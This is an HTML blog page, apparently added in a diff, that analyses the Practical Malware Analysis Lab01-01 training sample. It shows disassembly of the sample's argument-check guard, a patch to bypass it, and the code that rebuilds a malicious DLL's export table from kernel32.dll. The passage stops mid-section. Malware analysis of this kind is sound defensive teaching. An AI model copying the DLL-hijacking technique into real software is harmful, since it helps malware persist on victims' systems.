@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Lab01-01</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Lab01-01" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Practical Malware Analysis Lab01-01" />
+<meta property="og:description" content="Practical Malware Analysis Lab01-01" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-05T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Lab01-01","dateModified":"2020-04-05T00:00:00+02:00","datePublished":"2020-04-05T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/series/pma/pma-Lab01-01/"},"url":"/series/pma/pma-Lab01-01/","author":{"@type":"Person","name":"silma"},"description":"Practical Malware Analysis Lab01-01","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="practical-malware-analysis-lab01-01">Practical Malware Analysis Lab01-01</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, x64dbg (in a VM), CFF Explorer
+<strong>Prerequiste:</strong> <a href="/cheatsheets/pe/#import_table">import table</a>, <a href="/cheatsheets/pe/#export_table">export table</a>
+<strong>IDA databases:</strong> <a href="/assets/series/pma/Lab01-01_exe.i64">Lab01-01_exe.i64</a> <a href="/assets/series/pma/Lab01-01_dll.i64">Lab01-01_dll.i64</a><br />
+<a href=""></a></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Filename</th>
+      <th>Size</th>
+      <th>MD5</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Lab01-01.exe</td>
+      <td>16 Ko</td>
+      <td>bb7425b82141a1c0f7d60e5106676bb1</td>
+    </tr>
+    <tr>
+      <td>Lab01-01.dll</td>
+      <td>160 Ko</td>
+      <td>290934c61de9176ad682ffdd65f0a669</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+<h2 id="overview">Overview</h2>
+
+<p>The malware comes in two parts: a small executable (16 Ko) and a DLL (160 Ko) without export table.<br />
+The malicious <a href="#exe_analysis">EXE</a>:</p>
+<ul>
+  <li><a href="#rebuild_dll">Rebuild</a> the export table of the malicious DLL;</li>
+  <li><a href="#filesystem_alteration">Modify</a> part of the filesystem, so the malicious DLL is loaded when executables from the <em>System32</em> folder are executed;<br />
+The malicious <a href="#dll_analysis">DLL</a>:</li>
+  <li><a href="#mutex">Create</a> a mutex;</li>
+  <li><a href="#socket">Open</a> a socket to 127.26.152.13:80 an send a “<em>hello</em>” beacon;</li>
+  <li><a href="#commands">Process</a> received commands.</li>
+</ul>
+
+<h2 id="exe_analysis">Analysis of the malicious executable</h2>
+
+<h3 id="anti-fatfingers">Anti-fatfingers</h3>
+
+<p>A check of the command line is implemented to avoid the accidental execution of the malware. First, <em>argc</em> and <em>argv</em> are passed to the <em>_main()</em> function:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004018BF</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">_StartupInfo</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018C2</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004018C3</span>                 <span class="nv">push</span>    <span class="nv">_DoWildCard</span>
+<span class="err">0</span><span class="nf">x004018C9</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">env</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018CC</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004018CD</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">argv</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018D0</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004018D1</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">argc</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018D4</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x004018D5</span>                 <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">__getmainargs</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018F5</span>                 <span class="nv">push</span>    <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">envp</span><span class="p">]</span> 
+<span class="err">0</span><span class="nf">x004018F8</span>                 <span class="nv">push</span>    <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">argv</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018FB</span>                 <span class="nv">push</span>    <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">argc</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004018FE</span>                 <span class="nv">call</span>    <span class="nv">_main</span>
+</code></pre></div></div>
+
+<p>Then, within the <em>_main()</em> function, the code checks if the command line has exactly 2 arguments:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401440</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">argc</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401444</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">44h</span>
+<span class="err">0</span><span class="nf">x00401447</span>                 <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; check</span>
+<span class="err">0</span><span class="nf">x0040144A</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
+<span class="err">0</span><span class="nf">x0040144B</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
+<span class="err">0</span><span class="nf">x0040144C</span>                 <span class="nv">push</span>    <span class="nb">esi</span>
+<span class="err">0</span><span class="nf">x0040144D</span>                 <span class="nv">push</span>    <span class="nb">edi</span>
+<span class="err">0</span><span class="nf">x0040144E</span>                 <span class="nv">jnz</span>     <span class="nv">quit</span> <span class="c1">; exit if argc != 2</span>
+</code></pre></div></div>
+
+<p>Finally, it checks if the second argument matches the string “WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401454</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">54h</span><span class="o">+</span><span class="nv">argv</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401458</span>                 <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aWarni</span> <span class="c1">; string</span>
+<span class="err">0</span><span class="nf">x0040145D</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>    <span class="c1">; ptrArg n°2</span>
+<span class="err">0</span><span class="nf">x00401460</span>
+<span class="err">0</span><span class="nf">x00401460</span> <span class="nv">next_char</span><span class="p">:</span>
+<span class="err">0</span><span class="nf">x00401460</span>                 <span class="nv">mov</span>     <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>  <span class="c1">; Arg n°2 (char)</span>
+<span class="err">0</span><span class="nf">x00401462</span>                 <span class="nv">mov</span>     <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>  <span class="c1">; string looked for</span>
+<span class="err">0</span><span class="nf">x00401464</span>                 <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="nb">dl</span>
+<span class="err">0</span><span class="nf">x00401466</span>                 <span class="nv">cmp</span>     <span class="nb">dl</span><span class="p">,</span> <span class="nb">bl</span> <span class="c1">; check char</span>
+<span class="err">0</span><span class="nf">x00401468</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">dont_match</span> <span class="c1">; quit</span>
+<span class="err">0</span><span class="nf">x0040146A</span>                 <span class="nv">test</span>    <span class="nb">cl</span><span class="p">,</span> <span class="nb">cl</span>
+<span class="err">0</span><span class="nf">x0040146C</span>                 <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">got_end_of_string</span>
+<span class="err">0</span><span class="nf">x0040146E</span>                 <span class="nv">mov</span>     <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401471</span>                 <span class="nv">mov</span>     <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401474</span>                 <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="nb">dl</span>
+<span class="err">0</span><span class="nf">x00401476</span>                 <span class="nv">cmp</span>     <span class="nb">dl</span><span class="p">,</span> <span class="nb">bl</span>
+<span class="err">0</span><span class="nf">x00401478</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">dont_match</span> <span class="c1">; quit</span>
+<span class="err">0</span><span class="nf">x0040147A</span>                 <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>
+<span class="err">0</span><span class="nf">x0040147D</span>                 <span class="nv">add</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">2</span>
+<span class="err">0</span><span class="nf">x00401480</span>                 <span class="nv">test</span>    <span class="nb">cl</span><span class="p">,</span> <span class="nb">cl</span>
+<span class="err">0</span><span class="nf">x00401482</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">next_char</span>
+<span class="err">0</span><span class="nf">x00401484</span> <span class="nv">got_end_of_string</span><span class="p">:</span>     
+<span class="err">0</span><span class="nf">x00401484</span>                 <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span> <span class="c1">; good boy</span>
+<span class="err">0</span><span class="nf">x00401486</span>                 <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_40148D</span>
+</code></pre></div></div>
+<p>If both strings match, we reach the address <em>0x401484</em>. There, <em>eax</em> is set to zero and then the code jumps to <em>0x40148D</em>. This can be bypassed in many ways. I’ve chosen to patch the conditional <em>jnz</em> of the first check (<em>0x0040144E</em>) with this:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040144E</span>                 <span class="nv">xor</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">0</span><span class="nf">x00401450</span>                 <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_40148D</span>
+</code></pre></div></div>
+
+<h3 id="rebuild_dll">Rebuild the malicious DLL</h3>
+
+<p>The malicious executable uses the legitimate <em>kernel32.dll</em> found on the system to rebuilds the malicious DLL. The 3 main steps are:</p>
+<ul>
+  <li>The mapping of both <em>kernel32.dll</em> and <em>Lab01-01.dll</em> into its own address space (<a href="#memory_mapping_1">go there</a>);</li>
+  <li>The rebuilding of the IMAGE_EXPORT_DIRECTORY of <em>Lab01-01.dll</em> (<a href="#rebuild_export_dir">go there</a>);</li>
+  <li>The rebuilding of the ExportAddressTable, ExportOrdinalTable, ExportNamePointerTable, and <strong>ExportNameTable</strong> of <em>Lab01-01.dll</em> (<a href="#rebuild_eat_enpt_eot_ent">go there</a>).</li>
+</ul>
+
+<h4 id="memory_mapping_1">Mapping <em>kernel32.dll</em> and <em>Lab01-01.dll</em></h4>
+
+<p>Both DLLs are mapped using the following 3 APIs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea"><em>CreateFileA</em></a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga"><em>CreateFileMappingA</em></a>, and <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile"><em>MapViewOfFile</em></a>. The legitimate <em>kernel32.dll</em> is mapped with <em>read</em> permission, while <em>Lab01-01.dll</em> is mapped with <em>read</em> and <em>write</em> permissions. Snippets below detail the mapping of <em>kernel32.dll</em>:</p>
+
+<ol>
+  <li>First, get a file handle with <em>read</em> permission:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0040149B</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hTemplateFile</span>
+<span class="err">0</span><span class="nf">x0040149C</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; dwFlagsAndAttributes</span>
+<span class="err">0</span><span class="nf">x0040149D</span>    <span class="nv">push</span>    <span class="nv">OPEN_EXISTING</span>   <span class="c1">; dwCreationDisposition</span>
+<span class="err">0</span><span class="nf">x0040149F</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpSecurityAttributes</span>
+<span class="err">0</span><span class="nf">x004014A0</span>    <span class="nv">push</span>    <span class="nv">FILE_SHARE_READ</span> <span class="c1">; dwShareMode</span>
+<span class="err">0</span><span class="nf">x004014A2</span>    <span class="nv">push</span>    <span class="nv">GENERIC_READ</span>    <span class="c1">; dwDesiredAccess</span>
+<span class="err">0</span><span class="nf">x004014A7</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">FileName</span> <span class="c1">; path to kernel32.dll</span>
+<span class="err">0</span><span class="nf">x004014AC</span>    <span class="nv">call</span>    <span class="nb">edi</span> <span class="c1">; CreateFileA</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014BF</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">6Ch</span><span class="o">+</span><span class="nv">hFile_Kernel32_DLL</span><span class="p">],</span> <span class="nb">eax</span> <span class="c1">; </span>
+</code></pre></div>    </div>
+  </li>
+  <li>Next, create a file mapping object:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004014B4</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpName</span>
+<span class="err">0</span><span class="nf">x004014B6</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwMaximumSizeLow</span>
+<span class="err">0</span><span class="nf">x004014B8</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwMaximumSizeHigh</span>
+<span class="err">0</span><span class="nf">x004014BA</span>    <span class="nv">push</span>    <span class="nv">PAGE_READONLY</span>   <span class="c1">; flProtect</span>
+<span class="err">0</span><span class="nf">x004014BC</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpFileMappingAttributes</span>
+<span class="err">0</span><span class="nf">x004014BE</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFile</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014C3</span>    <span class="nv">call</span>    <span class="nb">ebx</span> <span class="c1">; CreateFileMappingA</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Finally, map a view of the DLL:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004014CB</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwNumberOfBytesToMap</span>
+<span class="err">0</span><span class="nf">x004014CD</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwFileOffsetLow</span>
+<span class="err">0</span><span class="nf">x004014CF</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwFileOffsetHigh</span>
+<span class="err">0</span><span class="nf">x004014D1</span>    <span class="nv">push</span>    <span class="nv">FILE_MAP_READ</span>   <span class="c1">; dwDesiredAccess</span>
+<span class="err">0</span><span class="nf">x004014D3</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFileMappingObject</span>
+<span class="err">0</span><span class="nf">x004014D4</span>    <span class="nv">call</span>    <span class="nb">ebp</span> <span class="c1">; MapViewOfFile</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014E0</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004014EC</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">70h</span><span class="o">+</span><span class="nv">address_mapped_k32</span><span class="p">],</span> <span class="nb">esi</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>As stated above, the same 3 APIs are used to map the malicious DLL with <em>read write</em> permissions (code not shown for brevity). An important thing to note is we have a 1:1 correspondence between the mapped view and the file on disk, meaning both will be aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">FileAlignment</a> field of the PE. If they were loaded using <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>, the memory image would have been aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members">SectionAlignment</a> field of the PE.<br />
+Let’s continue after the second call to <em>MapViewofFile</em> (seen at address <em>0x401525</em>).</p>
+
+<h4 id="rebuild_export_dir">Rebuilding the IMAGE_EXPORT_DIRECTORY</h4>
+
+<p>The function <em>0x401040</em> is called 5 times. Below illustrates the first call:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; esi = base address of mapped kernel32.dll</span>
+<span class="err">0</span><span class="nf">x00401538</span> <span class="nv">map_success</span><span class="p">:</span>                         
+<span class="err">0</span><span class="nf">x00401538</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mh">3Ch</span><span class="p">]</span>  <span class="c1">; e_lfanew</span>
+<span class="err">0</span><span class="nf">x0040153B</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; baseMappedView</span>
+<span class="err">0</span><span class="nf">x0040153C</span>    <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">esi</span>        <span class="c1">; Kernel32-&gt;NtHeaders</span>
+<span class="err">0</span><span class="nf">x0040153E</span>    <span class="nv">push</span>    <span class="nb">edi</span>             <span class="c1">; ptrNtHeaders</span>
+<span class="err">0</span><span class="nf">x0040153F</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">5Ch</span><span class="o">+</span><span class="nv">pNtHeaders</span><span class="p">],</span> <span class="nb">edi</span>
+<span class="err">0</span><span class="nf">x00401543</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mh">78h</span><span class="p">]</span>  <span class="c1">; Export Directory RVA</span>
+<span class="err">0</span><span class="nf">x00401546</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; RVA</span>
+<span class="err">0</span><span class="nf">x00401547</span>    <span class="nv">call</span>    <span class="nv">RVA2MappedAddress</span> <span class="c1">; </span>
+</code></pre></div></div>
+
+<p>After some digging, its purpose appears: converting a given RVA to a mapped address. Here is the prototype I came with:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BYTE</span><span class="o">*</span> 
+<span class="nf">RVA2MappedAddress</span><span class="p">(</span>
+    <span class="n">DWORD</span> <span class="n">RVA</span><span class="p">,</span> 
+    <span class="n">_IMAGE_NT_HEADERS</span><span class="o">*</span> <span class="n">ntHeaders</span><span class="p">,</span> 
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">imageBase</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<p>Where:</p>
+<ul>
+  <li>RVA is the value to convert;</li>
+  <li>ntHeaders points to the <em>PE\x00\x00</em> signature;</li>
+  <li>imageBase is the address of the mapped view (returned by <em>MapviewofFile</em> API).<br />
+<br />
+The 5 calls allow retrieving the addresses of:</li>
+  <li><strong>Export Directory</strong> of <em>kernel32.dll</em></li>
+  <li><strong>Export Directory</strong> of <em>Lab01-01.dll</em></li>
+  <li><strong>AddressOfFunctions</strong> of <em>kernel32.dll</em></li>
+  <li><strong>AddressesofNames</strong> of <em>kernel32.dll</em></li>
+  <li><strong>AddressesOfNameOrdinals</strong> of <em>kernel32.dll</em></li>
+</ul>
+
+<p>In addition, both <strong>NumberofFunctions</strong> and <strong>NumberOfNames</strong> of <em>kernel32.dll</em> are retrieved.<br />
+The following section details the conversion, but you can still <a href="#copy_export_dir">jump above the rabbit hole</a>.</p>
+
+<h5 id="rabbit-hole-converting-a-rva-to-a-mapped-address">Rabbit hole: converting a RVA to a mapped address</h5>
+
+<p>When a module is loaded into memory (e.g. with a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>), its sections are aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members"><strong>SectionAlignment</strong></a> field (default = page size, <em>0x1000</em> in my case). Hence, to get a virtual address from a RVA all we have to do is:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RVA + ImageBase = virtual address
+</code></pre></div></div>
+
+<p>In our case, however, both <em>kernel32.dll</em> and <em>Lab01-01.dll</em> are mapped with calls to <em>MapViewOfFile</em>, meaning we have a 1:1 correspondence between a mapped image and its corresponding file on disk. This implies the mapped image is aligned according to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#members"><strong>FileAlignment</strong></a> field (default is 0x200). Consequently, to compute the address indicated by a given RVA, we need to take into account these alignment differences. This is done in 3 steps:</p>
+
+<ol>
+  <li>Identify the section containing the value of the RVA: it is the purpose of the function <em>0x401000</em> (here renamed LocateHeaderOfSectionContainingRVA):
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401049</span>    <span class="nv">push</span>    <span class="nb">eax</span> <span class="c1">; -&gt;NtHeaders of kernel32</span>
+<span class="err">0</span><span class="nf">x0040104A</span>    <span class="nv">push</span>    <span class="nb">esi</span> <span class="c1">; RVA to convert</span>
+<span class="err">0</span><span class="nf">x0040104B</span>    <span class="nv">call</span>    <span class="nv">LocateHeaderOfSectionContainingRVA</span>
+<span class="err">0</span><span class="nf">x00401050</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
+</code></pre></div>    </div>
+    <p>If we step into the function <em>LocateHeaderOfSectionContainingRVA</em> (code not shown), we see it parses an array of <strong>_IMAGE_SECTION_HEADER</strong> structures until the following contition matches:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_IMAGE_SECTION_HEADER.VirtualAddress &lt;= RVA &lt; (_IMAGE_SECTION_HEADER.Misc.VirtualAddress + _IMAGE_SECTION_HEADER.VirtualSize
+</code></pre></div>    </div>
+    <p>A pointer to the _IMAGE_SECTION_HEADER matching the above condition is returned.</p>
+  </li>
+  <li>Then, the RVA is converted to a raw offset:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; ecx = pointer to _IMAGE_SECTION_HEADER</span>
+<span class="c1">; esi = RVA to convert</span>
+<span class="err">0</span><span class="nf">x0040105B</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">14h</span><span class="p">]</span>  <span class="c1">; section raw address</span>
+<span class="err">0</span><span class="nf">x0040105E</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">0Ch</span><span class="p">]</span>  <span class="c1">; section virtual address</span>
+<span class="err">0</span><span class="nf">x00401061</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="nv">baseMappedView</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401065</span>    <span class="nv">sub</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>
+<span class="err">0</span><span class="nf">x00401067</span>    <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">esi</span>  <span class="c1">; (rawaddr-vaddr)+RVA=RVAToOffset</span>
+<span class="err">0</span><span class="nf">x00401069</span>    <span class="nv">pop</span>     <span class="nb">esi</span>             <span class="c1">; restore esi</span>
+</code></pre></div>    </div>
+    <p>That is:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(_IMAGE_SECTION_HEADER.PointerToRawData - _IMAGE_SECTION_HEADER.VirtualAddress) + RVA
+</code></pre></div>    </div>
+    <p>In my opinion, this is more understandable if written this way:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(RVA - _IMAGE_SECTION_HEADER.VirtualAddress) + _IMAGE_SECTION_HEADER.PointerToRawData
+</code></pre></div>    </div>
+    <p>So, first we compute <strong>RVA - _IMAGE_SECTION_HEADER.VirtualAddress</strong>,  which gives us an <strong>offset from the start of the section</strong>. Then, because <strong>_IMAGE_SECTION_HEADER.PointerToRawData</strong> is the <strong>offset of the section from the start of the file</strong>, we simply add these two values to get to correct offset.</p>
+  </li>
+  <li>Finally, the the base address of the mapped image is added to the offset:
+    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; eax = offset</span>
+<span class="c1">; ecx = base of the mapped image</span>
+<span class="err">0</span><span class="nf">x0040106A</span>    <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ecx</span>        <span class="c1">; mapped address</span>
+<span class="err">0</span><span class="nf">x0040106C</span>    <span class="nv">retn</span>
+</code></pre></div>    </div>
+    <p>In the end, we have the right mapped address.</p>
+  </li>
+</ol>
+
+<h5 id="copy_export_dir">Copy <em>kernel32.dll</em> export table to <em>Lab01-01.dll</em></h5>
+
+<p>Right now, the <strong>export table</strong> of <em>Lab01-01.dll</em> is empty. So, <em>Lab01-01.exe</em> will copy the export table of <em>kernel32.dll</em> over the empty one. The copy is done with the following code:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004015B5</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">edi</span> <span class="c1">; size of export directory</span>
+<span class="err">0</span><span class="nf">x004015B7</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">ebx</span> <span class="c1">; kernel32 export directory</span>
+<span class="err">0</span><span class="nf">x004015B9</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="nb">ecx</span> <span class="c1">; export directory size</span>
+<span class="err">0</span><span class="nf">x004015BB</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebp</span> <span class="c1">; malicious export directory</span>
+<span class="err">0</span><span class="nf">x004015BD</span>    <span class="nv">shr</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; size/4 = nb dword</span>
+<span class="err">0</span><span class="nf">x004015C0</span>    <span class="nv">rep</span> <span class="nv">movsd</span>        <span class="c1">; overwrite </span>
+</code></pre></div></div>
+
+<p>Instruction <a href="https://c9x.me/x86/html/file_module_x86_id_203.html"><em>rep movsd</em></a> copies <em>ecx</em> <strong>dwords</strong> from the source address pointed by <em>esi</em> to the destination address pointed by <em>edi</em>. The value of <em>ecx</em> comes from <strong>IMAGE_DATA_DIRECTORY[0].Size</strong> (<em>0xA9B1</em> in my case. Code not shown, but it’s the value at <em>PE+0x7C</em>). Because <em>movsd</em> is used, <em>ecx</em> have to be divided by 4 (1 dword = 4 bytes); this is the purpose instruction <em>shr ecx, 2</em>. Indeed: <em>shr x, y</em> = <em>x/(2**y)</em> (and <em>shl x, y</em> = <em>x*(y**2)</em>).</p>
+
+<p>If the overall size to copy is not dword-aligned (i.e. between 1 and 3 bytes remains to be copied), the remaining bytes are copied with instruction <em>rep movsb</em>, which copy <em>ecx</em> <strong>bytes</strong> from <em>esi</em> to <em>edi</em>:</p>
